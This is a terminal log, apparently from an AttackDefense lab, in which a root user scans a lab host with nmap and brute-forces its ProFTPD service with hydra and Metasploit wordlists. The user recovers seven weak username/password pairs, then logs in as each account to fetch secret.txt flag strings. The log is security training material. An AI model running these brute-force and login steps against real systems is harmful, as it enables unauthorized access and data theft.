root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
941: eth0@if942: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
944: eth1@if945: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:77:e7:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.119.231.2/24 brd 192.119.231.255 scope global eth1
       valid_lft forever preferred_lft forever
       
root@attackdefense:~# ping 192.119.231.3
PING 192.119.231.3 (192.119.231.3) 56(84) bytes of data.
64 bytes from 192.119.231.3: icmp_seq=1 ttl=64 time=0.075 ms
64 bytes from 192.119.231.3: icmp_seq=2 ttl=64 time=0.062 ms
64 bytes from 192.119.231.3: icmp_seq=3 ttl=64 time=0.081 ms
^C

--- 192.119.231.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 36ms
rtt min/avg/max/mdev = 0.062/0.072/0.081/0.012 ms

root@attackdefense:~# nmap -sV 192.119.231.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 21:20 UTC
Nmap scan report for 1a18zfow7xek0xcp7cb1xwb4r.temp-network_a-119-231 (192.119.231.3)
Host is up (0.000011s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:77:E7:03 (Unknown)Service Info: OS: Unix
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds

root@attackdefense:~# hydra -t 10 -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/password.lst 192.119.231.3 ftp
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-03-04 21:51:48
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 618779 login tries (l:7/p:88397), ~61878 tries per task
[DATA] attacking ftp://192.119.231.3:21/
[21][ftp] host: 192.119.231.3   login: sysadmin   password: 654321
[STATUS] 88463.00 tries/min, 88463 tries in 00:01h, 530316 to do in 00:06h, 10 active
[STATUS] 29641.33 tries/min, 88924 tries in 00:03h, 529855 to do in 00:18h, 10 active
[21][ftp] host: 192.119.231.3   login: rooty   password: qwerty
[21][ftp] host: 192.119.231.3   login: demo   password: butterfly
[21][ftp] host: 192.119.231.3   login: auditor   password: chocolate
[21][ftp] host: 192.119.231.3   login: anon   password: purple
[21][ftp] host: 192.119.231.3   login: administrator   password: tweety
[21][ftp] host: 192.119.231.3   login: diag   password: tigger

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): sysadmin
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.Using binary mode to transfer files.ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20 09:30 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (69.4538 kB/s)
ftp> ^C
ftp> ^Z
[5]+  Stopped                 ftp 192.119.231.3
root@attackdefense:~# ls
README  hydra.restore  secret.txt  tools  wordlists

root@attackdefense:~# cat secret.txt
260ca9dd8a4577fc00b7bd5810298076

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): rooty
331 Password required for rooty
Password:
230 User rooty logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20 09:30 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (78.9867 kB/s)
ftp> ^Z
[6]+  Stopped                 ftp 192.119.231.3
root@attackdefense:~# ls
README  hydra.restore  secret.txt  tools  wordlists

root@attackdefense:~# cat secret.txt
e529a9cea4a728eb9c5828b13b22844c

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): demo
331 Password required for demo
Password:
230 User demo logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20 09:30 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (63.9416 kB/s)
ftp> ^Z
[7]+  Stopped                 ftp 192.119.231.3

root@attackdefense:~# cat secret.txt
d6a6bc0db10694a2d90e3a69648f3a03

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): auditor
331 Password required for auditor
Password:
230 User auditor logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20 09:30 secret.txt
226 Transfer complete
ftp> cat secret.txt
?Invalid command
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (76.9130 kB/s)
ftp> ^Z
[8]+  Stopped                 ftp 192.119.231.3

root@attackdefense:~# cat secret.txt
098f6bcd4621d373cade4e832627b4f6

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): anon
331 Password required for anon
Password:
230 User anon logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (78.6014 kB/s)
ftp> ^Z
[9]+  Stopped                 ftp 192.119.231.3

root@attackdefense:~# cat secret.txt
1bc29b36f623ba82aaf6724fd3b16718

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): #administrator^Z
[10]+  Stopped                 ftp 192.119.231.3

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): administrator
331 Password required for administrator
Password:
230 User administrator logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (68.2766 kB/s)
ftp> ^Z
[11]+  Stopped                 ftp 192.119.231.3

root@attackdefense:~# cat secret.txt
21232f297a57a5a743894a0e4a801fc3

root@attackdefense:~# ftp 192.119.231.3
Connected to 192.119.231.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.119.231.3]
Name (192.119.231.3:root): diag
331 Password required for diag
Password:
230 User diag logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (32.3560 kB/s)
ftp> ^Z
[12]+  Stopped                 ftp 192.119.231.3

root@attackdefense:~# cat secret.txt
12a032ce9179c32a6c7ab397b9d871fa
